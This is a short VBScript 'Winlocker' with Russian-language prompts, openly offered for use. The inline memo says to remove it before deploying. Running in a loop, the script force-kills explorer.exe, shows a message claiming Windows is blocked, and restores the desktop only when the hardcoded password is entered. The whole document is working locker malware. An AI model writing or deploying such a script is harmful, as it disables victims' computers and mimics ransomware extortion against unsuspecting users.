Do
set t=createobject("Wscript.Shell") 
set kill = createobject("wscript.shell") 
kill.run"taskkill /f /im explorer.exe",0
msgbox"УПС!Ваш windows был заблокирован!Для разблокировки необходим пароль!",64,"Winlocker"
x = inputbox("Чтобы разблокировать ваш windows,вы должны ввести пароль в данное окно.","Winlocker")
if (x = "54321") then  ЦИФРЫ В СКОБКАХ-ПАРОЛЬ! (при использовании уберите эту памятку полностью!)
msgbox"Правильный пароль!Ваш windows будет разблокирован!",64,"Winlocker"
t.run"explorer"
exit do
else
msgbox"Неправильный пароль!Попробуйте ещё!",16,"Winlocker"
end if
loop